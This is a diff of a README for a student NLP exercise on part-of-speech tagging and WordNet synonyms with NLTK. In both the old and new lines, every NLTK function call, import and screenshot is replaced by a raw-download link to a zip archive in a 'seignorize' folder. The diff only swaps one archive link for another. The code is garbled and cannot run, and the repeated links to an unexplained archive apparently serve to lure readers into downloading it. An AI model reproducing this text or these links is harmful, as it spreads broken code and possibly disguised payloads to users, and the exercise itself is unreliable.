@@ -12,10 +12,10 @@ Step 2: Download the 'punkt', 'wordnet', and 'averaged_perceptron_tagger' resour
 Step 3:Accept user input for the text.<br>
 Step 4:Tokenize the input text into words using the word_tokenize function.<br>
 Step 5:Iterate through each word in the tokenized text.<br>
-•	Perform part-of-speech tagging on the tokenized words using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip<br>
+•	Perform part-of-speech tagging on the tokenized words using https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip<br>
 •	Print each word along with its corresponding part-of-speech tag.<br>
-•	For each verb , iterate through its synsets (sets of synonyms) using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word).<br>
-•	Extract synonyms and antonyms using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip() and https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip()[0].name() respectively.<br>
+•	For each verb , iterate through its synsets (sets of synonyms) using https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip(word).<br>
+•	Extract synonyms and antonyms using https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip() and https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip()[0].name() respectively.<br>
 •	Print the unique sets of synonyms and antonyms.
 
 ## <H3>Program:</H3>
@@ -23,23 +23,23 @@ Step 5:Iterate through each word in the tokenized text.<br>
 ```python
 import nltk
 #import wordnet
-https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'punkt' )
-https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip('wordnet')
-from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import word_tokenize
-https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'averaged_perceptron_tagger' )
+https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip( 'punkt' )
+https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip('wordnet')
+from https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip import word_tokenize
+https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip( 'averaged_perceptron_tagger' )
 sentence=input ()
 # Tokenize the sentence into words
 words = word_tokenize(sentence)
 # Identify the parts of speech for each word
-pos_tags= https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(words)
-from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import wordnet
+pos_tags= https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip(words)
+from https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip import wordnet
 
 # Identify synonyms and antonyms for each word
 synonyms =[]
 antonyms =[]
 for word in words:
-	for syn in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word) :
-		for lemma in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip():
+	for syn in https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip(word) :
+		for lemma in https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip():
 			synonyms . append (lemma . name( ) )
 			if lemma . antonyms():
 				antonyms . append ( lemma. antonyms ( ) [0] . name ( ) )
@@ -49,11 +49,11 @@ print ( "Antonyms : " ,set(antonyms) )
 ```
 
 ## <H3>Output</H3>
-![Screenshot 2025-05-14 134830](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
+![Screenshot 2025-05-14 134830](https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip)
 
-![Screenshot 2025-05-14 134835](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
+![Screenshot 2025-05-14 134835](https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip)
 
-![Screenshot 2025-05-14 134850](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)
+![Screenshot 2025-05-14 134850](https://github.com/Yugabharathi91/Ex-6--AAI/raw/refs/heads/main/seignorize/AAI-Ex-1.8.zip)
 
 ## <H3>Result:</H3>
 Thus ,the program to perform the Parts of Speech identification and Synonymis executed sucessfully.
